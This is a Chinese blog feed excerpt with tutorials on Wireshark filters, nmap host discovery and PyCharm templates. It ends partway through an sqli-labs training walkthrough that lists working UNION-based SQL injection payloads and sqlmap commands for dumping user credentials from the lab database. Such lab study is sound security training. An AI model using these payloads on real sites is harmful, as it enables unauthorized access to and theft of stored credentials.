        <content type="html"><![CDATA[<blockquote><p> <a href="https://www.fujieace.com/hacker/tools/wireshark-4.html" target="_blank" rel="noopener">https://www.fujieace.com/hacker/tools/wireshark-4.html</a> </p></blockquote><p>抓包嗅探协议分析，安全专家必备的技能，抓包引擎linux的libpcap,windows的winpcap,解码能力。</p><a id="more"></a><p><img src="wireshark%E8%AF%A6%E8%A7%A3/1575036426464.png" alt="1575036426464.png"></p><p>上图三部分依次是：</p><p>数据包的列表（info是wireshark的说明列，并不一定是数据包中的原始内容），分协议层，源数据（ascii）</p><h2 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法"></a>基本使用方法</h2><h3 id="捕获过滤器"><a href="#捕获过滤器" class="headerlink" title="捕获过滤器"></a>捕获过滤器</h3><p>在捕获前设置软件即将捕获的数据包。</p><p>捕获过滤器表达式没有像显示过滤器表达式那样明显的规律，但写法不多所以也不难；而且除非全部捕获要占用的磁盘空间实现太大，且你非常明确过滤掉的数据包是你不需要的，不然一般都不用捕获过滤器表达式而用显示过滤器表达式。</p><h4 id="捕获过滤器表达式"><a href="#捕获过滤器表达式" class="headerlink" title="捕获过滤器表达式"></a>捕获过滤器表达式</h4><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Protocol&gt;  &lt;Direction&gt;  &lt;Host(s)&gt;  &lt;Value&gt;  &lt;Logical  Operations&gt;  &lt;Other expression&gt;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>Protocol（协议）：ether，fddi， ip，arp，rarp，decnet，lat， sca，moprc，mopdl，tcp，udp 等，如果没指明协议类型，则默认为捕捉所有支持的协议。</li><li>Direction（方向）：src， dst，srt，src and dst， src or dst等，如果没指明方向，则默认使用 “src or dst” 作为关键字。</li><li>Host(s)：net, port, host, portrange等，默认使用”host”关键字，”src 10.1.1.1″与”src host 10.1.1.1″等价。</li><li>Logical Operations（逻辑运算）：not, and, or 等，否(“not”)具有最高的优先级。或(“or”)和与(“and”)具有相同的优先级，运算时从左至右进行。</li></ul><h4 id="常见捕获过滤器表达式"><a href="#常见捕获过滤器表达式" class="headerlink" title="常见捕获过滤器表达式"></a>常见捕获过滤器表达式</h4><p>1、捕获某主机的HTTP流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">host 192.168.5.231 and port 80 and http  #只捕获主机192.168.5.231的http(80)流量</span><br><span class="line">port 80 and http  #捕获所有经过该接口的http(80)流量。</span><br><span class="line">host 192.168.5.231 and not port 80 #捕获主机192.168.5.231除http(80)之外的其他所有流量</span><br><span class="line">not port 80  #捕获除http(80)之外的其他所有流量</span><br><span class="line">not port 80 and !http  #捕获除http(80)之外的其他所有流量</span><br><span class="line">如果http被设置为8080，那么将80改为8080</span><br></pre></td></tr></table></figure><p>2、 捕获某(些)主机的所有流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host 192.168.5.231 #捕获源目主机均为192.168.5.231</span><br><span class="line">dst 192.168.5.231 #捕获目的主机均为192.168.5.231</span><br><span class="line">src 192.168.5.231 #捕获来源主机均为192.168.5.231</span><br><span class="line">net 192.168.5.0&#x2F;24 #捕获网段为192.168.5的所有主机的所有流量</span><br></pre></td></tr></table></figure><p>3、捕获某主机的DNS流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host 192.168.5.231 and port 53  # 只捕获主机192.168.5.231 的dns流量。</span><br><span class="line">src 192.168.5.231 and port 53   #只捕获主机192.168.5.231 对外的dns的流量。</span><br><span class="line">dst 192.168.5.231 and port 53  #只捕获dns服务器相应主机192.168.5.231的dns流量。</span><br><span class="line">port 53          #捕获接口中的所有主机的dns流量</span><br></pre></td></tr></table></figure><p>4、只(不)捕获ARP流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host 192.168.5.231 and arp#只捕获主机192.168.5.231 的arp流量。</span><br><span class="line">host 192.168.5.231 and !arp #只捕获主机192.168.5.231 除arp外的所有流量。</span><br><span class="line">arp #捕获接口中的所有arp请求</span><br><span class="line">!arp  #捕获接口中所有非arpq请求。</span><br></pre></td></tr></table></figure><p>5、只捕获特定端口的流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcp portrange 8000-9000 an port 80  #捕获端口8000-9000之间和80端口的流量</span><br><span class="line">port 5060  #捕获sip流量，因为sip的默认端口是5060。举一反三：port 22 #捕获ssh流量</span><br></pre></td></tr></table></figure><p>6、捕获电子邮件的流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host 192.168.5.231 and port 25      # 捕获主机192.168.5.231 的POP3协议的流量。</span><br><span class="line">port 25 and portrange 110-143  #因为电子邮件的协议：SMTP、POP3、IMAP4，所以捕获端口的流量。</span><br></pre></td></tr></table></figure><p>7、捕获vlan 的流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vlan #捕获所有vlan的流量</span><br><span class="line">vlan and (host 192.168.5.0 and port 80)  #捕获vlan 中主机192.168.5.0 ，前提是有vlan，在wifi中不一定可以捕获到相应的流量，局域网（公司，学校里面的网络应该有vlan)</span><br></pre></td></tr></table></figure><p>8、捕获 PPPoE 流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pppoes  #捕获所有的pppoes流量</span><br><span class="line">pppoes and (host 192.168.5.231 and port 80)   #捕获主机</span><br></pre></td></tr></table></figure><p>如果要捕获某种协议的流量，可以尝试捕获该端口的流量，请查看端口常识：<br><a href="https://svn.nmap.org/nmap/nmap-services" target="_blank" rel="noopener">https://svn.nmap.org/nmap/nmap-services</a></p><h3 id="显示过滤器"><a href="#显示过滤器" class="headerlink" title="显示过滤器"></a>显示过滤器</h3><p><img src="wireshark%E8%AF%A6%E8%A7%A3/1575037038992.png" alt="1575037038992"></p><p>管理显示过滤器：</p><p><img src="wireshark%E8%AF%A6%E8%A7%A3/1575037350033.png" alt="1575037350033.png"></p><h4 id="显示过滤器表达式"><a href="#显示过滤器表达式" class="headerlink" title="显示过滤器表达式"></a>显示过滤器表达式</h4><p>一条基本的表达式由过滤项、过滤关系、过滤值三项组成。<br>比如ip.addr == 192.168.1.1，这条表达式中ip.addr是过滤项、==是过滤关系，192.168.1.1是过滤值（整条表达示的意思是找出所有ip协议中源或目标ip、等于、192.168.1.1的数据包）</p><p>1.过滤项<br>wireshark的过滤项是 “协议” + “.” + “协议字段”。<br>以端口为例，端口出现于tcp协议中所以有端口这个过滤项且其写法就是tcp.port。<br>推广到其他协议，如eth、ip、udp、http、telnet、ftp、icmp、snmp等等其他协议都是这么个书写思路。当然wireshark出于缩减长度的原因有些字段没有使用协议规定的名称而是使用简写（比如Destination Port在wireshark中写为dstport）又出于简使用增加了一些协议中没有的字段（比如tcp协议只有源端口和目标端口字段，为了简便使用wireshark增加了tcp.port字段来同时代表这两个），但思路总的算是不变的。而且在实际使用时我们输入“协议”+“.”wireshark就会有支持的字段提示（特别是过滤表达式字段的首字母和wireshark在上边2窗口显示的字段名称首字母通常是一样的），看下名称就大概知道要用哪个字段了。<br>wireshark支持的全部协议及协议字段可查看：<a href="https://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener">https://www.wireshark.org/docs/dfref/</a></p><p>2.过滤关系<br>过滤关系就是大于、小于、等于等几种等式关系，我们可以直接看<a href="https://www.wireshark.org/docs/wsug_html/#FiltLogOps" target="_blank" rel="noopener">官方给出的表</a>。<br>注意其中有“English”和“C-like”两个字段，这个意思是说“English”和“C-like”这两种写法在wireshark中是等价的、都是可用的。</p><p>3.过滤值<br>过滤值就是设定的过滤项应该满足过滤关系的标准，比如500、5000、50000等等。过滤值的写法一般已经被过滤项和过滤关系设定好了，只是填下自己的期望值就可以了。</p><h4 id="复合过滤表达式"><a href="#复合过滤表达式" class="headerlink" title="复合过滤表达式"></a>复合过滤表达式</h4><p>所谓复合过滤表达示，就是指由多条基本过滤表达式组合而成的表达示。基本过滤表达式的写法还是不变的，复合过滤表达示多出来的东西就只是基本过滤表达示的“连接词”</p><p>我们依然直接参照<a href="https://www.wireshark.org/docs/wsug_html/#FiltLogOps" target="_blank" rel="noopener">官方给出的表</a>，同样“English”和“C-like”这两个字段还是说明这两种写法在wireshark中是等价的、都是可用的。</p><h4 id="常见用显示过滤需求及其对应表达式的示例"><a href="#常见用显示过滤需求及其对应表达式的示例" class="headerlink" title="常见用显示过滤需求及其对应表达式的示例"></a>常见用显示过滤需求及其对应表达式的示例</h4><p>数据链路层：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eth.src &#x3D;&#x3D; 04:f9:38:ad:13:26  # 筛选源mac地址为04:f9:38:ad:13:26的数据包</span><br><span class="line">eth.dst &#x3D;&#x3D; 04:f9:38:ad:13:26  # 筛选目的mac地址为04:f9:38:ad:13:26的数据包</span><br></pre></td></tr></table></figure><p>网络层：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip.addr &#x3D;&#x3D; 192.168.1.1  # 筛选ip地址为192.168.1.1的数据包</span><br><span class="line">ip.addr &#x3D;&#x3D; 192.168.1.1 &amp;&amp; ip.addr &#x3D;&#x3D; 192.168.1.2  # 筛选192.168.1.1和192.168.1.2之间的数据包</span><br><span class="line">ip.src &#x3D;&#x3D; 192.168.1.1 &amp;&amp; ip.dst &#x3D;&#x3D; 192.168.1.2  # 筛选从192.168.1.1到192.168.1.2的数据包</span><br></pre></td></tr></table></figure><p>传输层：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcp  # 筛选tcp协议的数据包</span><br><span class="line">!tcp # 筛选除tcp协议以外的数据包</span><br><span class="line">tcp.port &#x3D;&#x3D; 80 # 筛选端口为80的数据包</span><br><span class="line">tcp.port &#x3D;&#x3D; 12345 &amp;&amp; tcp.port &#x3D;&#x3D; 80 # 筛选12345端口和80端口之间的数据包</span><br><span class="line">tcp.srcport &#x3D;&#x3D; 12345 &amp;&amp; tcp.dstport &#x3D;&#x3D; 80 # 筛选从12345端口到80端口的数据包</span><br></pre></td></tr></table></figure><p>应用层：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http中http.request表示请求头中的第一行（如GET index.jsp HTTP&#x2F;1.1），http.response表示响应头中的第一行（如HTTP&#x2F;1.1 200 OK），其他头部都用http.header_name形式。</span><br><span class="line">http.request.uri contains &quot;.php&quot; # 筛选url中包含.php的http数据包</span><br><span class="line">http contains &quot;username&quot; # 筛选内容包含username的http数据包</span><br></pre></td></tr></table></figure><p>总结：<br>为了安全考虑，wireshark只能查看封包，而不能修改封包的内容，或者发送封包。<br>Wireshark能获取HTTP，也能获取HTTPS，但是不能解密HTTPS，所以wireshark看不懂HTTPS中的内容。如果是处理HTTP、HTTPS 还是建议大家用<a href="https://www.fujieace.com/hacker/tools/fiddler-2.html" target="_blank" rel="noopener">Fiddler</a>, 其他协议比如TCP、UDP等等就可以直接使用Wireshark。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>namp和zenmap详解</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/namp%E5%92%8Czenmap%E8%AF%A6%E8%A7%A3/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/namp%E5%92%8Czenmap%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>nmap是网络发现和安全审计工具，用来列举网络主机清单，管理服务升级调度，监控主机或服务运行状况。</p><a id="more"></a><ul><li><a href="https://blog.csdn.net/qq_36119192/article/details/82079150" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/82079150</a> </li></ul><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="探索主机是否在线"><a href="#探索主机是否在线" class="headerlink" title="探索主机是否在线"></a>探索主机是否在线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-sn: Ping Scan 只进行主机发现，不进行端口扫描。</span><br><span class="line">-PE&#x2F;PP&#x2F;PM: 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机。</span><br><span class="line">-PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]: 使用TCP SYN&#x2F;TCP ACK或SCTP INIT&#x2F;ECHO方式进行发现。 </span><br><span class="line">-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。 </span><br><span class="line">-Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。</span><br><span class="line">-PO[protocollist]: 使用IP协议包探测对方主机是否开启。  </span><br><span class="line">-n&#x2F;-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。  </span><br><span class="line">--dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS服务器。   </span><br><span class="line">--system-dns: 指定使用系统的DNS服务器   </span><br><span class="line">--traceroute: 追踪每个路由节点</span><br></pre></td></tr></table></figure><h4 id="探索公网IP"><a href="#探索公网IP" class="headerlink" title="探索公网IP"></a>探索公网IP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn</span><br></pre></td></tr></table></figure><p>Nmap会发送四种不同类型的数据包来探测目标主机是否在线。</p><p>ICMP echo request<br>a TCP SYN packet to port 443(https)<br>a TCP ACK packet to port 80(http)<br>an ICMP timestamp request </p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pycharm配置</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/pycharm%E9%85%8D%E7%BD%AE/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/pycharm%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>pycharm配置</p><a id="more"></a><h2 id="运行分配内存"><a href="#运行分配内存" class="headerlink" title="运行分配内存"></a>运行分配内存</h2><p>在pycharm安装目录下，bin/pycharm64.exe.vmoptions</p><p>-Xms为最小内存，-Xmx为最大内存</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>file-&gt;settings-&gt;plugins,搜索后安装即可</p><h2 id="自定义代码片段"><a href="#自定义代码片段" class="headerlink" title="自定义代码片段"></a>自定义代码片段</h2><h3 id="通用阶段"><a href="#通用阶段" class="headerlink" title="通用阶段"></a>通用阶段</h3><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>$end$</td><td>表示光标中途停留的位置</td></tr><tr><td>$ITERABLE$</td><td>表示光标初始停留的位置</td></tr><tr><td>$END$</td><td>表示光标最后停留的位置（tab切换）</td></tr><tr><td>$SELECTION$</td><td>表示被选中的代码</td></tr><tr><td>$class$</td><td>表示当前所在类名</td></tr><tr><td>$method$</td><td>表示当前所在方法名</td></tr><tr><td>$NAME$</td><td>名称位置标记（自定义），初始光标停留。一般多个$NAME$，用于同时命名。</td></tr><tr><td>$var$</td><td>变量位置标记（自定义），初始光标停留。一般多个$var$，用于同时命名。</td></tr><tr><td>$var1$</td><td>变量1，tab切换时，光标会在该处停留</td></tr><tr><td>$var2$</td><td>变量2，tab切换时，光标会在该处停留</td></tr><tr><td>$var3$</td><td>变量3，tab切换时，光标会在该处停留</td></tr></tbody></table><p>0、新建.py文件模板：</p><p>Setting-&gt;Editor-&gt;File and Code Templates-&gt;Files-&gt;Python Script进入代码片段编辑界面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Created by $USER on $DATE</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>从File-&gt;Setting-&gt;Editor-&gt;Live Templates-&gt;Python进入代码片段编辑界面 </p><p>1 、哈希加密：sha1        描述：sha1 encode hexdigest</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">s = sha1()</span><br><span class="line"></span><br><span class="line">s.update($password$.encode())</span><br><span class="line"></span><br><span class="line">$password$_sha1 = s.hexdigest()</span><br></pre></td></tr></table></figure><p>提示：$password$的默认值单独设置为”password”。</p><p>2、处理异常：try         描述：try except finally</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  $<span class="keyword">pass</span>$</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">  print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">  $clo$</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line">$END$</span><br></pre></td></tr></table></figure><p>提示：$pass$的默认值单独设置为”pass”；$clo的默认值设为”conn.close()”</p><p>3、处理异常：tee        描述：try… except… else</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  $SELECTION$$END$</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">  print(e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>提示：$SELECTION$表示被选中的代码。</p><p>使用时，选中要放入try中的代码，再按ctrl+alt+T，选择tee。</p><p>4、处理异常：tef         描述：try… except… finally</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">  $SELECTION$$END$</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">  print(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>提示：$SELECTION$表示被选中的代码。</p><p>使用时，选中要放入try中的代码，再按ctrl+alt+T，选择tef。</p><p>5、加双引号：str        描述：tostring</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"$SELECTION$"</span></span><br></pre></td></tr></table></figure><p>提示：$SELECTION$表示被选中的代码。</p><p>使用时，选中要放入””双引号中的代码，再按ctrl+alt+T，选择str。</p><p>6、返回真：rt         描述：return Ture</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="literal">True</span>$END$</span><br></pre></td></tr></table></figure><p>7、返回假：rf         描述：return False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="literal">False</span>$END$</span><br></pre></td></tr></table></figure><p> 8、类：class 描述：class default</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class $ClassName$(object):</span><br><span class="line">    <span class="string">"""docstring for $ClassName$"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, arg)</span>:</span></span><br><span class="line">        super($ClassName$, self).__init__()</span><br><span class="line">        self.arg = arg</span><br><span class="line">$END$</span><br></pre></td></tr></table></figure><h3 id="django阶段"><a href="#django阶段" class="headerlink" title="django阶段"></a>django阶段</h3><p>8、渲染模板：reren          描述：return render()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context&#x3D;&#123;$keyvalue$&#125;</span><br><span class="line"></span><br><span class="line">return render(request,&#39;$template$.html&#39;,context)</span><br></pre></td></tr></table></figure><p>提示：顺序和初始值  $template$=”booktest/index”、 $keyvalue$</p><p>9、准备数据：context          描述：context = {}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">context&#x3D;&#123;</span><br><span class="line"></span><br><span class="line">  &#39;$uname$&#39;:$uname$,</span><br><span class="line"></span><br><span class="line">  &#39;$upwd$&#39;:$upwd$,</span><br><span class="line"></span><br><span class="line">  &#39;$var3$&#39;:$var3$,</span><br><span class="line"></span><br><span class="line">  &#39;$var4$&#39;:$var4$,</span><br><span class="line"></span><br><span class="line">  &#39;$var5$&#39;:$var5$,</span><br><span class="line"></span><br><span class="line">  &#39;$var6$&#39;:$var6$,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：初始值  $uname$=”uname”、  $upwd$=”upwd”</p><p>10、准备数据：rehtt          描述：return HttpResponse()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return HttpResponse(&quot;$ok$&quot;)</span><br></pre></td></tr></table></figure><p>提示：初始值  $ok$=”ok”</p><p>11、准备数据：rejson          描述：return JsonResponse()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return JsonResponse(&#123;&#39;$count$&#39;: $count$&#125;)</span><br></pre></td></tr></table></figure><p>提示：初始值  $count$=”count”</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场练习</title>
      <link href="/categories/%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/categories/%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>sql靶场</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li><p>部署靶场过程参考：<a href="https://www.cnblogs.com/carlos-mm/p/8388351.html" target="_blank" rel="noopener">https://www.cnblogs.com/carlos-mm/p/8388351.html</a></p></li><li><p>靶场下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p></li></ul><p>安装平台：windows</p><p>环境配置：phpstudy集成，注：php版本要7以下 ，因为sqli-labs是很多年前的了，那个时候的php版本是5 。</p><p>安装步骤：将下载的文件解压发在phpstudy的WWW文件夹下，修改</p><p><code>sqli-labs/sql-connections/db-creds.inc</code>内的账号密码，打开sqli的网页，点击<code>Setup/reset Database for labs</code>安装。</p><ul><li>1-35wp参考：<a href="https://blog.csdn.net/qq_41420747/article/details/81836327" target="_blank" rel="noopener">https://blog.csdn.net/qq_41420747/article/details/81836327</a> </li></ul><h2 id="page-1"><a href="#page-1" class="headerlink" title="page-1"></a>page-1</h2><ul><li>order by 排序，数值时，某列；字符时，字段名；不存在该列时，报错。</li><li>union 合并多个select语句的结果集</li><li>concat()将两个或多个表达式加在一起。类似拼接字符串</li><li>rand()函数，随机0-1之间的数,floor(5+rand()*5)随机5到10</li><li>floor()去掉小数。floor(min + rand() * (max - min)) </li><li>limit 检索（例 limit 1,5 检索1后面五个，也就是2-6）</li><li>as  可理解为：用作、当成，作为；一般是重命名列名或者表名。（主要为了查询方便）</li><li>group by 查询结果进行分组统计，最终得到一个分组汇总表(每个组各返回一个结果)</li><li>left(被截取字符串， 截取长度)</li><li>substr(string, start, length) </li></ul><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>get字符型报错注入</p><ul><li>手工注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">找注入点，id处存在注入点，修改id的值，页面发生改变。判断id的值类型</span><br><span class="line">?id&#x3D;2&#39;</span><br><span class="line">报错信息：...near &#39;&#39;2&#39;&#39; LIMIT 0,1&#39; at line 1，根据报错提示，判断出闭合条件为单引号，成功闭合</span><br><span class="line">?id&#x3D;2&#39; --+</span><br><span class="line">判断字段数为三个</span><br><span class="line">?id&#x3D;2&#39; order by 3 --+</span><br><span class="line">爆数据库名（[union操作符](https:&#x2F;&#x2F;www.runoob.com&#x2F;sql&#x2F;sql-union.html)）union 合并多个select语句的结果集，此处id&#x3D;0无结果，才会显示后面我们自己的结果。</span><br><span class="line">?id&#x3D;0&#39; union select 1,database(),version() --+</span><br><span class="line">爆表名</span><br><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">爆字段名，查看表单名，挑选其中的users</span><br><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database() --+</span><br><span class="line">爆出字段值，根据爆出的字段名，挑选username和password</span><br><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(username,0x3a,password) from security.users --+</span><br></pre></td></tr></table></figure><ul><li>sqlmap注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db --batch</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; --tables --batch</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users --columns --batch</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users -C username,password --dump --batch</span><br></pre></td></tr></table></figure><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>get整形报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;    #报错为：near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br><span class="line">?id&#x3D;1 --+    #成功闭合</span><br></pre></td></tr></table></figure><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>get字符型报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 